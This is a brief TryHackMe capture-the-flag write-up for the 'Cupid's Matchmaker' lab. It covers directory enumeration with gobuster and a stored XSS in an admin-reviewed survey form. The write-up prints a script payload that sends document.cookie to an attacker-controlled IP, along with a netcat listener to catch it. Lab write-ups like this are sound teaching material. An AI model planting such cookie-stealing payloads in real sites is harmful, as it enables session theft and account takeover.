# TryHackMe Cupid's Matchmaker Writeup

---

## Goubuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.66.188.124:5000
```

<img width="1172" height="487" alt="image" src="https://github.com/user-attachments/assets/f4699219-74de-4a10-bb2c-99d99d75b8fc" />

### when i try to access /admin it return me to login 

<img width="1664" height="743" alt="image" src="https://github.com/user-attachments/assets/e6d19b13-6dea-43bc-8073-07f43b2a7d9f" />

### so now let's se /survey 

<img width="991" height="777" alt="image" src="https://github.com/user-attachments/assets/7cf764bd-3a3b-4744-9a34-73fbe9698a1b" />

## it's have alot of input feilds and this survey will viewed by admin so i will try to do XSS

```
 <script>fetch('http://192.168.168.188:8000/cookie='+document.cookie);</script>
nc -lnvp 8000
```

<img width="1349" height="779" alt="image" src="https://github.com/user-attachments/assets/c7047089-2526-4f0f-8b7c-480886e406ea" />

<img width="1179" height="340" alt="image" src="https://github.com/user-attachments/assets/67ab89bc-1d73-40de-8d28-a97dfdb11ceb" />

